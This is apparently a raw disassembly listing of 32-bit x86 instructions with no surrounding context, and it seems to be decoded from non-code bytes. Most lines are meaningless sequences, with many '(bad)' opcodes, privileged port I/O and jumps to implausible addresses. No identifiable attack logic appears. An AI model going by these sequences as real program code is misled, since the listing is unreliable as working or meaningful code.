  42746f:	les    ebp,FWORD PTR [edx-0x22380f23]
  427475:	shl    eax,0xda
  427478:	aad    0xc0
  42747a:	mov    ch,0xf6
  42747c:	mov    ah,0xdb
  42747e:	div    edx
  427480:	loop   0x427469
  427482:	cmc    
  427483:	div    dh
  427485:	fdivrp st(1),st
  427487:	(bad)  
  427489:	pop    es
  42748a:	out    0xa,al
  42748c:	sti    
  42748d:	(bad)  
  42748f:	into   
  427490:	mov    cl,0xde
  427492:	into   
  427493:	lods   al,BYTE PTR ds:[esi]
  427494:	mov    al,0xc6
  427496:	into   
  427497:	neg    eax
  427499:	cmc    
  42749a:	mov    ebx,0xf8d3bbac
  42749f:	jmp    0x129359a
  4274a4:	ret    0xd107
  4274a7:	loope  0x427474
  4274a9:	lock out dx,al
  4274ab:	add    BYTE PTR [eax],al
  4274ad:	out    0xe6,eax
  4274af:	in     al,dx
  4274b0:	mov    ecx,0xbdeed6e5
  4274b5:	mul    ecx
  4274b7:	leave  
  4274b8:	int    0xd4
  4274ba:	mov    cl,0xb8
  4274bc:	fcmovnu st,st(3)
  4274be:	in     eax,dx
  4274bf:	add    esi,esi
  4274c1:	mov    esi,0xf6d7d4e1
  4274c6:	repnz std 
  4274c8:	push   es
  4274c9:	hlt    
  4274ca:	psubsb mm1,mm6
  4274cd:	into   
  4274ce:	(bad)  
  4274d0:	call   0xeb2836cc
  4274d5:	in     eax,dx
  4274d6:	aam    0xbb
  4274d8:	stc    
  4274d9:	push   ebp
  4274db:	shl    ch,cl
  4274dd:	mov    ecx,0xc2e9d0f5
  4274e2:	(bad)  
  4274e3:	out    dx,al
  4274e4:	loope  0x4274a9
  4274e6:	cld    
  4274e7:	or     ah,dh
  4274e9:	leave  
  4274ea:	rcl    ah,0xcb
  4274ed:	jmp    0x4274d8
  4274ef:	stc    
  4274f0:	scas   al,BYTE PTR es:[edi]
  4274f1:	xlat   BYTE PTR ds:[ebx]
  4274f2:	leave  
  4274f3:	(bad)
  4274f6:	(bad)  
  4274f7:	xlat   BYTE PTR ds:[ebx]
  4274f8:	retf   
  4274f9:	xlat   BYTE PTR ds:[ebx]
  4274fa:	enter  0xd3ca,0xf4
  4274fe:	int3   
  4274ff:	jecxz  0x4274bf
  427501:	clc    
  427502:	mov    eax,0xfcc101d5
  427507:	shr    al,1
  427509:	loopne 0x4274f0
  42750b:	rol    BYTE PTR [esi],0xd4
  42750e:	or     edx,edi
  427510:	retf   0xc8ca
  427513:	in     al,dx
  427514:	repz mov bl,0xc6
  427517:	mov    dh,0xd5
  427519:	not    esp
  42751b:	enter  0xeebf,0xbd
  42751f:	add    ebx,eax
  427521:	(bad)  
  427522:	hlt    
  427523:	out    dx,al
  427524:	fcom   st(3)
  427526:	or     bh,bh
  427528:	in     al,0xdb
  42752a:	(bad)  
  42752b:	or     edi,ecx
  42752d:	sysret 
  42752f:	fucomp st(1)
  427531:	mov    ebp,0xcdadc4a9
  427536:	lods   al,BYTE PTR ds:[esi]
  427537:	retf   0xd9f3
  42753a:	mov    cl,0xf8
  42753c:	stc    
  42753d:	mov    edx,0xfff9e2d7
  427542:	mov    esp,0xc3dec5f8
  427547:	cld    
  427548:	or     DWORD PTR [edx],eax
  42754a:	sti    
  42754b:	clc    
  42754c:	out    0xcb,eax
  42754e:	push   es
  42754f:	or     BYTE PTR [eax-0x3b18113c],ch
  427555:	int3   
  427556:	iret   
  427557:	iret   
  427558:	out    dx,al
  427559:	in     eax,0xfe
  42755b:	retf   
  42755c:	mov    bh,0xca
  42755e:	add    edi,DWORD PTR [ecx-0x2a3f230a]
  427564:	test   edx,0xd405f5f6
  42756a:	add    eax,0xc1fdc3c6
  42756f:	iret   
  427570:	(bad)  
  427571:	jmp    0x427530
  427573:	into   
  427574:	out    dx,al
  427575:	aam    0xd7
  427577:	xlat   BYTE PTR ds:[ebx]
  427578:	icebp  
  427579:	retf   0xefb9
  42757c:	mov    ebp,0xf6f8fbf0
  427581:	rol    cl,1
  427583:	mov    BYTE PTR [edi],0xe4
  427586:	loopne 0x427568
  427588:	retf   0xefdf
  42758b:	add    bh,al
  42758d:	aam    0xc8
  42758f:	retf   0xc3ae
  427592:	call   0xf11a5e60
  427597:	aad    0xc4
  427599:	rcl    edi,1
  42759b:	jmp    0x42758d
  42759d:	mov    dl,0xb4
  42759f:	mov    al,0xd5
  4275a1:	enter  0xc2cf,0xf5
  4275a5:	fincstp 
  4275a7:	add    bh,al
  4275a9:	std    
  4275aa:	push   es
  4275ab:	(bad)  
  4275ac:	std    
  4275ad:	add    al,BYTE PTR [eax]
  4275af:	add    al,0xde
  4275b1:	ret    0xc9ef
  4275b4:	shl    edx,0xcb
  4275b7:	out    dx,al
  4275b8:	stc    
  4275b9:	icebp  
  4275ba:	repz fdiv DWORD PTR [ebx-0x301410a]
  4275c1:	shl    BYTE PTR [ebp-0x3a222822],cl
  4275c7:	loopne 0x4275a4
  4275c9:	(bad)  
  4275cb:	add    al,BYTE PTR [edx]
  4275cd:	retf   0xfaf2
  4275d0:	lds    ebp,FWORD PTR [esi-0x3d370d3f]
  4275d6:	out    dx,eax
  4275d7:	(bad)  
  4275d9:	sar    DWORD PTR [edx-0x2032010b],1
  4275df:	(bad)  
  4275e0:	jmp    0xc7436dbc
  4275e5:	std    
  4275e6:	jmp    0x401:0xfdc7f8c0
  4275ed:	clc    
  4275ee:	cli    
  4275ef:	fnstcw WORD PTR [eax-0x4313232e]
  4275f5:	in     al,dx
  4275f6:	lock leave 
  4275f8:	cli    
  4275f9:	enter  0xb8f3,0xb6
  4275fd:	mov    edx,0xbfbeddcd
  427602:	shr    ah,0xe3
  427605:	aad    0xc6
  427607:	std    
  427608:	ret    
  427609:	inc    bh
  42760b:	jecxz  0x4275e5
  42760d:	iret   
  42760e:	cli    
  42760f:	cld    
  427610:	loopne 0x4275bb
  427612:	retf   
  427613:	loopne 0x4275f7
  427615:	in     eax,dx
  427616:	lods   al,BYTE PTR ds:[esi]
  427617:	sti    
  427618:	int3   
  427619:	int3   
  42761a:	in     eax,0xda
  42761c:	fistp  QWORD PTR [eax-0x3001321e]
  427622:	mov    edi,0xdb0401d5
  427627:	jmp    0xb02:0x1f8ffd9
  42762e:	add    ecx,ebx
  427630:	les    esi,FWORD PTR [edx-0x433f0811]
  427636:	in     al,dx
  427637:	lods   al,BYTE PTR ds:[esi]
  427638:	repz lds esi,FWORD PTR [eax+esi*8-0x1d2d442c]
  427640:	add    bh,BYTE PTR [edi-0xd0d2c28]
  427646:	or     al,cl
  427648:	call   0xe9257929
  42764d:	or     bh,dh
  42764f:	out    dx,al
  427650:	mov    ecx,0xabb3e0f0
  427655:	enter  0xb3ce,0xda
  427659:	rcl    ah,cl
  42765b:	mov    eax,0xf5e9d8d6
  427660:	loopne 0x427637
  427662:	add    BYTE PTR [eax-0x27222829],bh
  427668:	mov    edi,0xe70b00d5
  42766d:	call   0xcbef567e
  427672:	int3   
  427673:	(bad)  
  427674:	in     al,dx
  427675:	in     al,dx
  427676:	mov    cl,0xdb
  427678:	jmp    0x427669
  42767a:	cmc    
  42767b:	leave  
  42767c:	jmp    0xeed0:0xf3f8c9ff
  427683:	int    0x0
  427685:	fisttp QWORD PTR [edx]
  427687:	jecxz  0x427649
  427689:	pop    es
  42768a:	aad    0xda
  42768c:	add    esp,ebx
  42768e:	jecxz  0x42767b
  427690:	leave  
  427691:	ret    0xcbad
  427694:	in     al,dx
  427695:	ret    
  427696:	out    dx,al
  427697:	iret   
  427698:	jmp    0xf7f94452
  42769d:	jmp    0xdd32756b
  4276a2:	into   
  4276a3:	test   esp,0xdadc01ff
  4276a9:	jmp    0xef324596
  4276ae:	out    0xdc,eax
  4276b0:	scas   al,BYTE PTR es:[edi]
  4276b1:	out    dx,al
  4276b2:	jmp    0x427667
  4276b4:	shl    edx,cl
  4276b6:	repz iret 
  4276b8:	mov    cl,0xc5
  4276ba:	enter  0xddfa,0xc8
  4276be:	fcom   st(2)
  4276c0:	ret    
  4276c1:	lock cld 
  4276c3:	in     al,dx
  4276c4:	shl    cl,cl
  4276c6:	mov    ebp,0xfce1e4d8
  4276cb:	iret   
  4276cc:	pmulhw mm6,mm2
  4276cf:	repnz sar BYTE PTR [eax-0xb0a1d2d],cl
  4276d6:	call   0xf9f958cc
  4276db:	div    ebx
  4276dd:	fcom   st(7)
  4276df:	ror    ebp,1
  4276e1:	shl    edx,cl
  4276e3:	mov    edi,0xfedfc0e2
  4276e8:	push   edi
  4276ea:	in     al,0xfc
  4276ec:	push   es
  4276ed:	jmp    0xe32f83de
  4276f2:	in     eax,dx
  4276f3:	lods   al,BYTE PTR ds:[esi]
  4276f4:	repnz fcmovne st,st(0)
  4276f7:	loopne 0x4276ab
  4276f9:	shl    ah,1
  4276fb:	in     al,0xb4
  4276fd:	mov    eax,0xb6d501ce
  427702:	int3   
  427703:	(bad)  
  427705:	add    cl,ah
  427707:	clc    
  427708:	ffreep st(4)
  42770a:	or     bl,dh
  42770c:	out    dx,eax
  42770d:	in     al,dx
  42770e:	int    0xc0
  427710:	test   al,0xce
  427712:	shr    BYTE PTR [edx+esi*8-0x27041612],1
  427719:	int3   
  42771a:	clc    
  42771b:	in     eax,0xff
  42771d:	mov    edx,0xedbbf7ea
  427722:	out    dx,eax
  427723:	mov    ah,0xdb
  427725:	(bad)  
  427726:	faddp  st(3),st
  427728:	icebp  
  427729:	add    edx,esp
  42772b:	cld    
  42772c:	in     al,0xe8
  42772e:	repnz fmul st,st(6)
  427731:	lods   eax,DWORD PTR ds:[esi]
  427732:	jmp    0xb6102f13
  427737:	ror    ebp,1
  427739:	fbstp  TBYTE PTR [eax-0x1422b06]
  42773f:	iret   
  427740:	jmp    0x7466446
  427745:	clc    
  427746:	stc    
  427747:	(bad)  
  427749:	or     DWORD PTR [eax],ecx
  42774b:	or     BYTE PTR [ebx],cl
  42774d:	(bad)  
  42774f:	add    eax,0xf2c0bea7
  427754:	jmp    0x427745
  427756:	jmp    0xeddb:0xf4eeb7d7
  42775d:	mov    eax,0xffbfbdee
  427762:	std    
  427763:	cmc    
  427764:	fcomi  st,st(7)
  427766:	fcmovnb st,st(3)
  427768:	or     bl,bh
  42776a:	or     esi,ebx
  42776c:	add    ch,bh
  42776e:	dec    edi
  427770:	into   
  427771:	shr    bh,1
  427773:	faddp  st(1),st
  427775:	leave  
  427776:	lds    esi,FWORD PTR [esp+eax*8-0x83b4e]
  42777d:	mov    esi,0xc0d1fdb5
  427782:	fdiv   st(3),st
  427784:	repnz hlt 
  427786:	fcmovnb st,st(0)
  427788:	sar    bh,0xf6
  42778b:	invd   
  42778d:	les    ecx,FWORD PTR [eax]
  42778f:	into   
  427790:	lods   al,BYTE PTR ds:[esi]
  427791:	(bad)  
  427792:	fsubp  st(5),st
  427794:	shr    bh,cl
  427796:	enter  0xe6e1,0xce
  42779a:	fdivrp st(6),st
  42779c:	mov    ebp,0xe3f3f2be
  4277a1:	clc    
  4277a2:	hlt    
  4277a3:	push   es
  4277a4:	add    eax,0xf6eac1e4
  4277a9:	loope  0x427794
  4277ab:	push   es
  4277ac:	loop   0x427772
  4277ae:	or     eax,0xd6cdbf02
  4277b3:	shl    bl,0xc1
  4277b6:	rcl    bh,cl
  4277b8:	aad    0xd9
  4277ba:	imul   ecx
  4277bc:	int3   
  4277bd:	jmp    0x427788
  4277bf:	call   0xf93d6795
  4277c4:	(bad)
  4277c7:	out    0xc0,eax
  4277c9:	shr    dh,1
  4277cb:	shl    ch,0xe5
  4277ce:	call   0xc12060dd
  4277d3:	aad    0xe5
  4277d5:	loop   0x42778a
  4277d7:	enter  0xbafa,0xfe
  4277db:	shl    esp,1
  4277dd:	jecxz  0x4277db
  4277df:	int    0xdb
  4277e1:	mov    dh,0xf5
  4277e3:	icebp  
  4277e4:	ret    0xf9db
  4277e7:	(bad)  
  4277e8:	cli    
  4277e9:	clc    
  4277ea:	(bad)
  4277ed:	cld    
  4277ee:	jmp    0xeac9:0xe7dec2ff
  4277f5:	icebp  
  4277f6:	lods   eax,DWORD PTR ds:[esi]
  4277f7:	mov    ch,0xb3
  4277f9:	fnstcw WORD PTR [edx-0xc2c2614]
  4277ff:	fucom  st(0)
  427801:	add    cl,ch
  427803:	xlat   BYTE PTR ds:[ebx]
  427804:	shr    esp,1
  427806:	aam    0x5
  427808:	(bad)  
  42780a:	out    0xfc,eax
  42780c:	add    al,0xf4
  42780e:	lds    eax,FWORD PTR [edx+edx*8]
  427811:	jmp    0xf4d5:0xf1e6e8c4
  427818:	ror    dl,1
  42781a:	xlat   BYTE PTR ds:[ebx]
  42781b:	mov    edx,0xf8d0b4ce
  427820:	rcl    ebp,cl
  427822:	sti    
  427823:	repz fsubrp st(5),st
  427826:	jmp    0xe0e0:0xe2ddf9c2
  42782d:	in     eax,0xd3
  42782f:	fistp  QWORD PTR [ecx-0x2e11422f]
  427835:	out    0xed,eax
  427837:	mov    ebx,0xd1d1b1ba
  42783c:	fmul   st,st(0)
  42783e:	ret    
  42783f:	mov    ebp,0xfcfdface
  427844:	mov    esi,0xd7f9f7fb
  427849:	fucomi st,st(2)
  42784b:	into   
  42784c:	(bad)  
  42784d:	push   cs
  42784e:	stc    
  42784f:	or     BYTE PTR [edi-0x1e315615],bh
  427855:	leave  
  427856:	lods   eax,DWORD PTR ds:[esi]
  427857:	loop   0x427820
  427859:	repnz out dx,al
  42785b:	xlat   BYTE PTR ds:[ebx]
  42785c:	call   0xf93e6a57
  427861:	aam    0xee
  427863:	loopne 0x42783b
  427865:	add    al,0xd2
  427867:	fcmovnu st,st(1)
  427869:	or     BYTE PTR [edx],al
  42786b:	cld    
  42786c:	add    al,0xca
  42786e:	cld    
  42786f:	std    
  427870:	ret    
  427871:	out    0xe1,al
  427873:	int3   
  427874:	enter  0xe8c1,0xec
  427878:	mov    dl,0xc8
  42787a:	div    DWORD PTR [esi-0x2333b4a]
  427880:	ret    0xfbf4
  427883:	aam    0xd3
  427885:	std    
  427886:	add    al,ah
  427888:	xlat   BYTE PTR ds:[ebx]
  427889:	fld    DWORD PTR [eax]
  42788b:	push   cs
  42788c:	loopne 0x42789c
  42788e:	loope  0x427874
  427890:	in     al,0xb2
  427892:	(bad)  
  427893:	into   
  427894:	ror    esi,1
  427896:	loop   0x427844
  427898:	test   esp,0xd0f4f4e5
  42789e:	loop   0x427891
  4278a0:	in     al,dx
  4278a1:	loop   0x42787d
  4278a3:	clc    
  4278a4:	cld    
  4278a5:	int3   
  4278a6:	mov    ebp,0xe6f0c5d2
  4278ab:	push   cs
  4278ac:	call   0xac537b75
  4278b1:	repz loop 0x427891
  4278b4:	repz lds esi,FWORD PTR [ecx-0x17153030]
  4278bb:	mov    ecx,0xb4b4fcb3
  4278c0:	out    dx,eax
  4278c1:	repz jecxz 0x427896
  4278c4:	fcmovnu st,st(2)
  4278c6:	add    edi,esi
  4278c8:	add    al,0xf6
  4278ca:	pavgb  mm1,mm0
  4278cd:	fsubrp st(5),st
  4278cf:	add    eax,0xc3b1eea8
  4278d4:	imul   bl
  4278d6:	rep lods al,BYTE PTR ds:[esi]
  4278d8:	int3   
  4278d9:	call   0xc50b5db0
  4278de:	lock xlat BYTE PTR ds:[ebx]
  4278e0:	sar    ebp,1
  4278e2:	cmc    
  4278e3:	icebp  
  4278e4:	(bad)
  4278e8:	or     ah,al
  4278ea:	add    bh,BYTE PTR [esp+esi*8-0xf142523]
  4278f1:	scas   eax,DWORD PTR es:[edi]
  4278f2:	jmp    0x4278c5
  4278f4:	rcl    ah,1
  4278f6:	(bad)  
  4278f7:	mov    dh,0xd2
  4278f9:	out    0xb7,eax
  4278fb:	repz jmp 0x4278ec
  4278fe:	jmp    0x4278f4
  427900:	loope  0x4278c4
  427902:	repnz mov esp,0xd7f4f203
  427908:	imul   bl
  42790a:	cli    
  42790b:	out    dx,al
  42790c:	add    ah,bl
  42790e:	fimul  WORD PTR [ebx]
  427910:	stos   DWORD PTR es:[edi],eax
  427911:	mov    dl,0xbf
  427913:	shl    cl,0xf0
  427916:	out    0xda,al
  427918:	out    0xf9,al
  42791a:	fmul   st,st(2)
  42791c:	fidivr DWORD PTR [edi-0x17082e14]
  427922:	aad    0xfd
  427924:	repnz test DWORD PTR [edx],0xdee6d4e3
  42792b:	in     al,0xc7
  42792d:	hlt    
  42792e:	fmul   DWORD PTR [ebx]
  427930:	scas   eax,DWORD PTR es:[edi]
  427931:	mov    bl,0xcc
  427933:	aad    0xf6
  427935:	xlat   BYTE PTR ds:[ebx]
  427936:	out    dx,al
  427937:	lods   al,BYTE PTR ds:[esi]
  427938:	mov    dh,0xd6
  42793a:	clc    
  42793b:	repnz mov eax,0xf2caf1bc
  427941:	cmc    
  427942:	pop    es
  427943:	int    0x7
  427945:	in     al,0xdd
  427947:	pop    es
  427948:	leave  
  427949:	fucomi st,st(6)
  42794b:	fucompp 
  42794d:	in     al,dx
  42794e:	jmp    0xd4326a60
  427953:	(bad)  
  427954:	hlt    
  427955:	mov    bh,0xcc
  427957:	lock call 0xe9fe5828
  42795d:	int    0xeb
  42795f:	mov    ah,0xce
  427961:	shl    ecx,0xf7
  427964:	repz rol BYTE PTR ds:0xcad0d9dd,1
  42796b:	fcmovnb st,st(7)
  42796d:	aam    0xd9
  42796f:	fadd   st,st(0)
  427971:	loopne 0x427960
  427973:	jecxz  0x427965
  427975:	(bad)  [edi-0x4e2f0b18]
  42797b:	enter  0xd3fe,0xdf
  42797f:	sar    al,cl
  427981:	mov    dh,0xfe
  427983:	fild   WORD PTR [eax]
  427985:	test   DWORD PTR [edx],0x7cafcfe
  42798b:	fmulp  st(3),st
  42798d:	aam    0x7
  42798f:	cld    
  427990:	rcl    ecx,cl
  427992:	fucomip st,st(3)
  427994:	rol    edi,0xb0
  427997:	retf   
  427998:	cli    
  427999:	out    dx,al
  42799a:	out    0xf0,al
  42799c:	mov    ebx,0xe1edbeea
  4279a1:	int3   
  4279a2:	int    0xc7
  4279a4:	clc    
  4279a5:	in     eax,0xe3
  4279a7:	mov    eax,0xca0a01e2
  4279ac:	ret    
  4279ad:	jmp    0xd402788f
  4279b2:	in     al,dx
  4279b3:	imul   bh
  4279b5:	mov    ebp,0xdbb9f3a8
  4279bb:	(bad)  
  4279bc:	mov    ebx,0xc8b9bdcf
  4279c1:	sar    ecx,cl
  4279c3:	fsubrp st(7),st
  4279c5:	cmc    
  4279c6:	(bad)  
  4279c7:	rol    BYTE PTR [edi],1
  4279c9:	leave  
  4279ca:	paddusw mm0,QWORD PTR [edi]
  4279cd:	call   0xeced83db
  4279d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279d3:	mov    esi,0xcdccb6e2
  4279d8:	jmp    0xd4f0:0xdff2f6ae
  4279df:	aad    0xe3
  4279e1:	add    bh,BYTE PTR [ecx+0x4e1d5e7]
  4279e7:	stc    
  4279e8:	jmp    0x45065dd
  4279ed:	int    0xef
  4279ef:	loopne 0x4279af
  4279f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279f2:	xlat   BYTE PTR ds:[ebx]
  4279f3:	ret    
  4279f4:	loop   0x4279c4
  4279f6:	shl    esi,1
  4279f8:	enter  0xb1f8,0xf7
  4279fc:	sti    
  4279fd:	int3   
  4279fe:	mov    ch,0xf0
  427a00:	call   esi
  427a02:	rcl    ecx,cl
  427a04:	mov    ebp,0xe3c10ad3
  427a09:	fisttp WORD PTR [edx]
  427a0b:	aad    0xc9
  427a0d:	aam    0xdf
  427a0f:	add    ah,al
  427a11:	mov    ebp,0xe9ede2d3
  427a16:	in     eax,0xe0
  427a18:	mov    al,0xfa
  427a1a:	(bad)  
  427a1b:	mov    edx,0xb0e3cffb
  427a20:	cli    
  427a21:	rcl    ch,1
  427a23:	cli    
  427a24:	add    cl,bl
  427a26:	push   es
  427a27:	jmp    0x427a2e
  427a29:	rol    DWORD PTR [ebx],0xdc
  427a2c:	loop   0x427a07
  427a2e:	fisttp QWORD PTR [eax]
  427a30:	jecxz  0x4279ff
  427a32:	scas   eax,DWORD PTR es:[edi]
  427a33:	icebp  
  427a34:	test   dh,0xf4
  427a37:	(bad)  [ecx-0x324451a]
  427a3d:	retf   
  427a3e:	out    dx,eax
  427a3f:	in     al,dx
  427a40:	(bad)  
  427a42:	sti    
  427a43:	add    eax,0xd4d306fc
  427a48:	fcmovnu st,st(2)
  427a4a:	cld    
  427a4b:	in     eax,dx
  427a4c:	out    0xf9,al
  427a4e:	jmp    0xe0d7:0xc4c9f2d8
  427a55:	out    0xf1,al
  427a57:	mov    al,0xb6
  427a59:	int3   
  427a5a:	retf   0xc9f4
  427a5d:	sar    dl,cl
  427a5f:	idiv   bh
  427a61:	rol    al,1
  427a63:	mov    ebp,0xc400ded8
  427a68:	shl    bh,1
  427a6a:	aad    0x3
  427a6c:	or     ebp,ecx
  427a6e:	or     eax,0xc6ddaafc
  427a73:	mov    ebp,0xcce7c5f5
  427a78:	jmp    0x427a3e
  427a7a:	leave  
  427a7b:	leave  
  427a7c:	in     al,dx
  427a7d:	xlat   BYTE PTR ds:[ebx]
  427a7e:	enter  0xd1f3,0xf1
  427a82:	fidivr DWORD PTR [ebp-0x3b3c2505]
  427a88:	add    ah,dh
  427a8a:	in     al,0xf8
  427a8c:	jecxz  0x427a99
  427a8e:	in     eax,dx
  427a8f:	out    0xb9,al
  427a91:	mov    bl,0xb3
  427a94:	out    dx,eax
  427a95:	in     eax,dx
  427a96:	int    0xc9
  427a98:	mov    al,0xd4
  427a9a:	jmp    0x427a90
  427a9c:	fidiv  WORD PTR [edx-0x29040846]
  427aa2:	aad    0xe0
  427aa4:	loopne 0x427a8a
  427aa6:	fstp   st(2)
  427aa8:	loopne 0x427aa0
  427aaa:	cli    
  427aab:	cld    
  427aac:	pop    es
  427aad:	or     eax,0xcea9de04
  427ab2:	out    dx,eax
  427ab3:	rcr    ah,cl
  427ab5:	rcl    edi,1
  427ab7:	div    eax
  427ab9:	lock (bad) 
  427abc:	shl    edi,cl
  427abe:	repnz div edi
  427ac1:	add    ah,dh
  427ac3:	fxch   st(4)
  427ac5:	div    esi
  427ac7:	push   es
  427ac8:	(bad)  
  427aca:	add    edx,esp
  427acc:	out    0x6,al
  427ace:	std    
  427acf:	fcmovb st,st(6)
  427ad1:	out    0xf2,eax
  427ad3:	retf   
  427ad4:	out    dx,eax
  427ad5:	shr    esp,1
  427ad7:	hlt    
  427ad8:	stc    
  427ad9:	repz repnz in eax,dx
  427adc:	repz enter 0xcfbe,0xe0
  427ae1:	out    0xdc,eax
  427ae3:	mov    edi,0xdabde3bd
  427ae8:	(bad)  
  427ae9:	(bad)  
  427aeb:	jmp    0xcb2b78b4
  427af0:	into   
  427af1:	shl    BYTE PTR [edx-0x36091311],0xb6
  427af8:	iret   
  427af9:	sti    
  427afa:	(bad)
  427afd:	out    dx,eax
  427afe:	icebp  
  427aff:	jecxz  0x427aef
  427b01:	rcr    dh,cl
  427b03:	hlt    
  427b04:	repz shl ebx,0xfa
  427b08:	jmp    0x427ad3
  427b0a:	test   DWORD PTR [ecx],0x90eddea
  427b10:	in     eax,0xe7
  427b12:	int3   
  427b13:	jmp    0x427b00
  427b15:	aad    0xf6
  427b17:	iret   
  427b18:	ror    eax,1
  427b1a:	clc    
  427b1b:	in     al,0xf2
  427b1d:	jmp    0xf3d2:0xbcfcd7f8
  427b24:	in     al,dx
  427b25:	std    
  427b26:	fld    DWORD PTR [eax]
  427b28:	inc    DWORD PTR [esi]
  427b2a:	test   bh,0xc6
  427b2d:	or     bl,dh
  427b2f:	in     al,0xf1
  427b31:	ret    0xd5c7
  427b34:	fmul   st(5),st
  427b36:	lock lock clc 
  427b39:	rcl    cl,cl
  427b3b:	xlat   BYTE PTR ds:[ebx]
  427b3c:	mov    ebx,0xffd4dab2
  427b41:	(bad)  
  427b43:	int3   
  427b44:	fdivrp st(2),st
  427b46:	shr    ecx,0xc9
  427b49:	mov    DWORD PTR [eax],0xdb0bdfe2
  427b4f:	jmp    0xf2c5:0xedaeb0f1
  427b56:	mov    dh,0xe1
  427b58:	mov    dl,0xee
  427b5a:	hlt    
  427b5b:	retf   0xfef5
  427b5e:	jmp    0xf51d3665
  427b63:	sar    esp,1
  427b65:	add    eax,0xe2c409fa
  427b6a:	rcr    ecx,0xf
  427b6d:	push   cs
  427b6e:	add    dh,dl
  427b70:	retf   
  427b71:	int3   
  427b72:	out    dx,al
  427b73:	retf   0xc8cf
  427b76:	jmp    0x427b24
  427b78:	clc    
  427b79:	icebp  
  427b7a:	mov    eax,0xf2ebb3d3
  427b7f:	repz (bad) 
  427b82:	neg    ecx
  427b84:	(bad)  
  427b85:	hlt    
  427b86:	mov    BYTE PTR [edx],0xf0
  427b89:	idiv   bh
  427b8b:	fisttp QWORD PTR [ebx]
  427b8d:	loope  0x427b70
  427b8f:	rcl    ebx,cl
  427b91:	in     al,0xc1
  427b93:	rol    al,cl
  427b95:	aam    0xb2
  427b97:	out    dx,eax
  427b98:	fcmovne st,st(6)
  427b9a:	clc    
  427b9b:	mov    bh,0xc4
  427b9d:	enter  0xcddd,0xce
  427ba1:	pop    es
  427ba2:	in     eax,dx
  427ba3:	mov    esi,0xf7f3fbc3
  427ba8:	imul   bl
  427baa:	add    al,0xfa
  427bac:	(bad)  
  427bae:	jecxz  0x427b7f
  427bb0:	repz fnsave [edx-0x164b3a34]
  427bb7:	out    dx,eax
  427bb8:	in     al,dx
  427bb9:	mov    al,0xed
  427bbb:	lods   al,BYTE PTR ds:[esi]
  427bbc:	fsubr  st,st(1)
  427bbe:	neg    cl
  427bc0:	xlat   BYTE PTR ds:[ebx]
  427bc1:	mov    edx,0xfcc5d5f9
  427bc6:	add    eax,0xf705c6c7
  427bcb:	fsub   st(1),st
  427bcd:	clc    
  427bce:	adc    edx,DWORD PTR [ecx]
  427bd0:	ret    
  427bd1:	fsubrp st(3),st
  427bd3:	mov    cl,0xe4
  427bd5:	jmp    0xd0244ac0
  427bda:	repnz leave 
  427bdc:	aam    0xe8
  427bde:	call   0xe7f957c0
  427be3:	push   es
  427be4:	rcl    ch,0xf7
  427be7:	repnz jmp 0xf3ca:0x107f4f7
  427bef:	add    edx,esp
  427bf1:	retf   0xeecf
  427bf4:	lock in al,0xca
  427bf7:	int3   
  427bf8:	hlt    
  427bf9:	shr    BYTE PTR [ebp+0x3cff2cb],1
  427bff:	stc    
  427c00:	add    esp,eax
  427c02:	out    0xd3,al
  427c04:	hlt    
  427c05:	fst    st(6)
  427c07:	(bad)  
  427c08:	or     edx,edi
  427c0a:	enter  0xffd9,0x6
  427c0e:	lds    eax,FWORD PTR [esi]
  427c10:	mov    ecx,0xb0e8ebee
  427c15:	ret    
  427c16:	lds    ebp,FWORD PTR [eax-0xb2c3f18]
  427c1c:	in     al,0xec
  427c1e:	cli    
  427c1f:	in     al,dx
  427c20:	clc    
  427c21:	ret    0x7e1
  427c24:	rcl    ch,0x4
  427c27:	retf   
  427c28:	fcmovu st,st(7)
  427c2a:	(bad)  
  427c2c:	jmp    0x427c08
  427c2e:	out    0xeb,eax
  427c30:	faddp  st(3),st
  427c32:	in     eax,0xc6
  427c34:	shl    dh,cl
  427c36:	jecxz  0x427c05
  427c38:	ror    edx,0xfe
  427c3b:	(bad)  
  427c3c:	fst    st(3)
  427c3e:	mov    ecx,0xdabaf2d3
  427c43:	in     al,dx
  427c44:	add    dl,al
  427c46:	or     eax,DWORD PTR [edi+eiz*8]
  427c49:	loope  0x427c56
  427c4b:	fimul  WORD PTR [esi]
  427c4d:	iret   
  427c4e:	fucomip st,st(1)
  427c50:	retf   
  427c51:	shl    ebx,cl
  427c53:	in     al,0xe4
  427c55:	in     eax,dx
  427c56:	mul    ah
  427c58:	cmc    
  427c59:	lock out 0xe6,eax
  427c5c:	fmul   st,st(3)
  427c5e:	fxch   st(7)
  427c60:	mov    edi,0xe7f7e2e2
  427c65:	test   DWORD PTR [esi],0xc902e10b
  427c6b:	or     esp,esi
  427c6d:	cld    
  427c6e:	in     eax,0xa
  427c70:	in     al,0xee
  427c72:	lods   eax,DWORD PTR ds:[esi]
  427c73:	mov    dh,0xcc
  427c75:	shl    BYTE PTR [esi-0x384d501c],0xeb
  427c7c:	in     al,0xfb
  427c7e:	fprem  
  427c80:	div    esp
  427c82:	(bad)  
  427c83:	mov    ah,0xc6
  427c85:	add    ecx,DWORD PTR [ebx]
  427c87:	sar    edi,1
  427c89:	(bad)  
  427c8a:	enter  0xe900,0xe3
  427c8e:	stc    
  427c8f:	or     esi,DWORD PTR [ebx-0x36512932]
  427c95:	enter  0xc5d7,0xda
  427c99:	jmp    0x427c81
  427c9b:	fucomi st,st(7)
  427c9d:	fdivp  st(6),st
  427c9f:	mov    edx,0xc6bec2ec
  427ca4:	aad    0xd2
  427ca6:	mov    ah,0xdb
  427ca9:	sti    
  427caa:	or     ebx,edx
  427cac:	enter  0xe9e2,0xfd
  427cb0:	in     eax,0xdf
  427cb2:	iret   
  427cb3:	aad    0xe4
  427cb5:	mov    esp,0xf8e4d1f5
  427cba:	fidiv  DWORD PTR [esi-0x12132038]
  427cc0:	(bad)  
  427cc2:	mov    ch,0xda
  427cc4:	rcr    cl,1
  427cc6:	shl    edx,0xf7
  427cc9:	aam    0xc6
  427ccb:	push   cs
  427ccc:	leave  
  427ccd:	(bad)  
  427ccf:	into   
  427cd0:	(bad)  [edi-0x3d4d1b2d]
  427cd6:	mov    al,0xec
  427cd8:	aam    0xcf
  427cda:	jmp    0x427ca8
  427cdc:	jmp    0xee3079b4
  427ce1:	shl    ebp,0xf4
  427ce4:	ret    
  427ce5:	cld    
  427ce6:	jecxz  0x427cea
  427ce8:	jmp    0xf903:0xcbeae8fe
  427cef:	add    ecx,esp
  427cf1:	repnz shr ebp,cl
